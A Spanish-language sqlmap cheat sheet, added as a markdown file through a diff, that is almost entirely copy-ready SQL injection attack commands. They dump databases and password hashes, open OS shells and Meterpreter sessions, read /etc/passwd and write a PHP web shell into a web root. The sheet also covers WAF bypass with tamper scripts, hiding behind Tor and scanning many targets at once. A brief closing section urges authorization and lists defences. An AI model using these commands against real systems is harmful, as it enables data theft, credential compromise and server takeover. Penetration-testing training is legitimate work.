@@ -1,0 +1,356 @@
+# SQLMAP - AUTOMATED SQL INJECTION TOOL
+
+## Descripción
+SQLMap es la herramienta automática más avanzada para detectar y explotar 
+vulnerabilidades de inyección SQL. Soporta múltiples SGBD y técnicas de explotación.
+
+## Ejemplo Real
+Durante un pentest web, encuentras un formulario de búsqueda en http://tienda.com/buscar.php?q=producto
+Para verificar si es vulnerable a SQL injection:
+sqlmap -u "http://tienda.com/buscar.php?q=producto" --dbs --batch
+
+## Comandos Básicos
+sqlmap -u "URL"                   # Escaneo básico
+sqlmap -u "URL" --dbs             # Enumerar bases de datos
+sqlmap -u "URL" -D basedatos --tables  # Enumerar tablas
+sqlmap -u "URL" -D basedatos -T tabla --columns  # Enumerar columnas
+sqlmap -u "URL" -D basedatos -T tabla --dump     # Volcar datos
+
+## Detección y Enumeración
+
+# Detección básica de vulnerabilidad
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Usar proxy (Burp Suite)
+sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
+
+# Especificar parámetro vulnerable
+sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
+
+# Desde archivo de request HTTP
+sqlmap -r request.txt
+
+# Con cookies de sesión
+sqlmap -u "URL" --cookie="PHPSESSID=abc123; user=admin"
+
+# Con headers personalizados
+sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1"
+
+# POST data
+sqlmap -u "URL" --data="username=admin&password=test"
+
+# Desde archivo con múltiples URLs
+sqlmap -m urls.txt
+
+## Enumeración de Base de Datos
+
+# Listar bases de datos
+sqlmap -u "URL" --dbs
+
+# Información del SGBD
+sqlmap -u "URL" --banner
+
+# Usuario actual de la BD
+sqlmap -u "URL" --current-user
+
+# Base de datos actual
+sqlmap -u "URL" --current-db
+
+# Verificar si el usuario es DBA
+sqlmap -u "URL" --is-dba
+
+# Listar usuarios de la BD
+sqlmap -u "URL" --users
+
+# Passwords de usuarios
+sqlmap -u "URL" --passwords
+
+# Privilegios de usuarios
+sqlmap -u "URL" --privileges
+
+# Enumerar roles
+sqlmap -u "URL" --roles
+
+## Enumeración de Esquemas
+
+# Listar tablas de una BD específica
+sqlmap -u "URL" -D nombre_bd --tables
+
+# Listar columnas de una tabla
+sqlmap -u "URL" -D nombre_bd -T tabla --columns
+
+# Contar registros de una tabla
+sqlmap -u "URL" -D nombre_bd -T tabla --count
+
+# Obtener esquema completo
+sqlmap -u "URL" --schema
+
+# Buscar columnas por nombre
+sqlmap -u "URL" --search -C "password,pwd,pass"
+
+# Buscar tablas por nombre
+sqlmap -u "URL" --search -T "user,admin,login"
+
+## Extracción de Datos
+
+# Volcar tabla completa
+sqlmap -u "URL" -D bd -T tabla --dump
+
+# Volcar columnas específicas
+sqlmap -u "URL" -D bd -T tabla -C "username,password" --dump
+
+# Volcar con condiciones
+sqlmap -u "URL" -D bd -T tabla --where="id>100"
+
+# Volcar primeros N registros
+sqlmap -u "URL" -D bd -T tabla --start=1 --stop=10 --dump
+
+# Excluir columnas específicas
+sqlmap -u "URL" -D bd -T tabla --exclude-col="timestamp,log" --dump
+
+# Volcar toda la base de datos
+sqlmap -u "URL" -D bd --dump-all
+
+# Volcar solo datos, sin estructura
+sqlmap -u "URL" -D bd -T tabla --dump --no-escape
+
+## Técnicas de Inyección
+
+# Especificar técnica (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)
+sqlmap -u "URL" --technique=BEUST
+
+# Solo técnicas ciegas
+sqlmap -u "URL" --technique=BT
+
+# Solo UNION-based
+sqlmap -u "URL" --technique=U
+
+# Forzar uso de payloads específicos
+sqlmap -u "URL" --tamper=space2comment,randomcase
+
+# Nivel de detección (1-5)
+sqlmap -u "URL" --level=3
+
+# Nivel de riesgo (1-3)
+sqlmap -u "URL" --risk=2
+
+# Especificar SGBD
+sqlmap -u "URL" --dbms=mysql
+
+# Forzar el OS del servidor
+sqlmap -u "URL" --os=linux
+
+## Bypass de Protecciones
+
+# WAF bypass con tamper scripts
+sqlmap -u "URL" --tamper=space2comment,charencode,randomcase
+
+# Delay entre requests
+sqlmap -u "URL" --delay=2
+
+# Timeout personalizado
+sqlmap -u "URL" --timeout=30
+
+# Randomizar User-Agent
+sqlmap -u "URL" --random-agent
+
+# User-Agent personalizado
+sqlmap -u "URL" --user-agent="Mozilla/5.0 Custom"
+
+# Usar Tor para anonimato
+sqlmap -u "URL" --tor --tor-type=SOCKS5
+
+# Check tor connection
+sqlmap --tor --check-tor
+
+## Técnicas Avanzadas
+
+# Inyección de segundo orden
+sqlmap -u "URL" --second-order="http://target.com/profile.php"
+
+# Evaluar expresiones
+sqlmap -u "URL" --sql-query="SELECT user()"
+
+# Shell interactiva SQL
+sqlmap -u "URL" --sql-shell
+
+# Obtener shell del sistema
+sqlmap -u "URL" --os-shell
+
+# Command execution
+sqlmap -u "URL" --os-cmd="id"
+
+# PowerShell (Windows)
+sqlmap -u "URL" --os-pwn
+
+# Meterpreter payload
+sqlmap -u "URL" --os-pwn --msf-path=/usr/share/metasploit-framework
+
+## File System Access
+
+# Leer archivos del sistema
+sqlmap -u "URL" --file-read="/etc/passwd"
+
+# Escribir archivos
+sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Subir archivos
+sqlmap -u "URL" --file-upload="payload.php" --file-dest="/tmp/"
+
+## Casos de Uso Prácticos
+
+# Ejemplo 1: E-commerce con búsqueda vulnerable
+sqlmap -u "http://shop.com/search.php?q=laptop&category=electronics" -p q --dbs --batch
+
+# Ejemplo 2: Panel administrativo con login vulnerable
+sqlmap -u "http://admin.company.com/login.php" --data="user=admin&pass=test" --dbs --batch
+
+# Ejemplo 3: API REST vulnerable
+sqlmap -u "http://api.company.com/users/1" --headers="Content-Type: application/json" --dbs
+
+# Ejemplo 4: Aplicación con autenticación
+sqlmap -u "http://app.com/profile.php?id=1" --cookie="session=abc123" -D userdb -T users --dump
+
+# Ejemplo 5: Bypassing WAF
+sqlmap -u "http://protected.com/page.php?id=1" --tamper=space2comment,charencode --random-agent --delay=1
+
+## Tamper Scripts Útiles
+
+apostrophemask.py          # Reemplaza apostrofes con UTF-8
+apostrophenullencode.py    # Reemplaza apostrofes con %00%27
+base64encode.py            # Codifica payload en base64
+between.py                 # Reemplaza > con NOT BETWEEN 0 AND #
+bluecoat.py                # Bypass Blue Coat ProxySG
+charencode.py              # URL-encode caracteres
+charunicodeencode.py       # Unicode encode caracteres
+commentbeforeparentheses.py # Agrega comentario antes de paréntesis
+concat2concatws.py         # Reemplaza CONCAT con CONCAT_WS
+equaltolike.py             # Reemplaza = con LIKE
+greatest.py                # Reemplaza > con GREATEST
+halfversionedmorekeywords.py # Agrega comentarios versionados
+ifnull2ifisnull.py         # Reemplaza IFNULL con IF(ISNULL())
+modsecurityversioned.py    # Bypass ModSecurity
+modsecurityzeroversioned.py # Bypass ModSecurity con comentarios
+multiplespaces.py          # Agrega múltiples espacios
+nonrecursivereplacement.py # Reemplaza keywords predefinidos
+overlongutf8.py            # Codifica caracteres UTF-8
+percentage.py              # Agrega % antes de cada carácter
+randomcase.py              # Randomiza mayúsculas/minúsculas
+randomcomments.py          # Agrega comentarios aleatorios
+securesphere.py            # Bypass SecureSphere WAF
+space2comment.py           # Reemplaza espacios con comentarios
+space2dash.py              # Reemplaza espacios con --
+space2hash.py              # Reemplaza espacios con #
+space2morehash.py          # Reemplaza espacios con # aleatorios
+space2mssqlblank.py        # Reemplaza espacios con caracteres blancos MSSQL
+space2mssqlhash.py         # Reemplaza espacios con # para MSSQL
+space2mysqlblank.py        # Reemplaza espacios con caracteres blancos MySQL
+space2mysqldash.py         # Reemplaza espacios con -- para MySQL
+space2plus.py              # Reemplaza espacios con +
+space2randomblank.py       # Reemplaza espacios con caracteres blancos aleatorios
+unionalltounion.py         # Reemplaza UNION ALL SELECT con UNION SELECT
+unmagicquotes.py           # Reemplaza quotes con comentarios multi-línea
+versionedkeywords.py       # Encierra keywords en comentarios versionados
+versionedmorekeywords.py   # Encierra keywords en comentarios versionados (más)
+
+## Configuración y Optimización
+
+# Archivo de configuración
+~/.sqlmap/sqlmap.conf
+
+# Configuraciones útiles
+[Target]
+url = http://target.com/page.php?id=1
+data = 
+cookie = 
+headers = 
+
+[Request]
+method = GET
+delay = 0
+timeout = 30
+retries = 3
+randomAgent = False
+
+[Injection]
+technique = BEUST
+level = 1
+risk = 1
+
+[Detection]
+textOnly = False
+titles = False
+
+[Enumeration]
+getBanner = False
+getCurrentUser = False
+getCurrentDb = False
+isDba = False
+
+## Scripts de Automatización
+
+# Bash script para múltiples objetivos
+#!/bin/bash
+for url in $(cat urls.txt); do
+    sqlmap -u "$url" --batch --dbs | tee results_$(echo $url | tr '/' '_').txt
+done
+
+# Python script para análisis masivo
+import subprocess
+import sys
+
+urls = [
+    "http://target1.com/page.php?id=1",
+    "http://target2.com/search.php?q=test",
+    "http://target3.com/profile.php?user=admin"
+]
+
+for url in urls:
+    cmd = ["sqlmap", "-u", url, "--batch", "--dbs"]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    print(f"URL: {url}")
+    print(f"Result: {result.stdout}")
+    print("-" * 50)
+
+## Integración con Otras Herramientas
+
+# Con Burp Suite
+# 1. Interceptar request en Burp
+# 2. Save request to file
+# 3. sqlmap -r request.txt --proxy="http://127.0.0.1:8080"
+
+# Con Nikto
+nikto -h target.com | grep -i sql
+sqlmap -u "http://target.com/vulnerable_page.php?param=1"
+
+# Con dirb/gobuster
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+sqlmap -u "http://target.com/found_page.php?id=1"
+
+## Reportes y Documentación
+
+# Generar reporte HTML
+sqlmap -u "URL" --dbs --report
+
+# Verbose output
+sqlmap -u "URL" -v 3
+
+# Guardar todo el output
+sqlmap -u "URL" --dbs --batch > sqlmap_results.txt 2>&1
+
+# Configurar path de output
+sqlmap -u "URL" --output-dir=/tmp/sqlmap_results
+
+## Notas de Seguridad
+- Usar solo en sistemas autorizados
+- Documentar todas las inyecciones encontradas
+- No volcar datos sensibles en entornos de producción
+- Coordinar con el equipo de desarrollo para fixes
+- Respetar políticas de rate limiting
+
+## Contramedidas y Defensa
+- Usar prepared statements/parametrized queries
+- Validación y sanitización de input
+- Principio de menor privilegio en BD
+- WAF con reglas actualizadas
+- Logging y monitoreo de consultas SQL
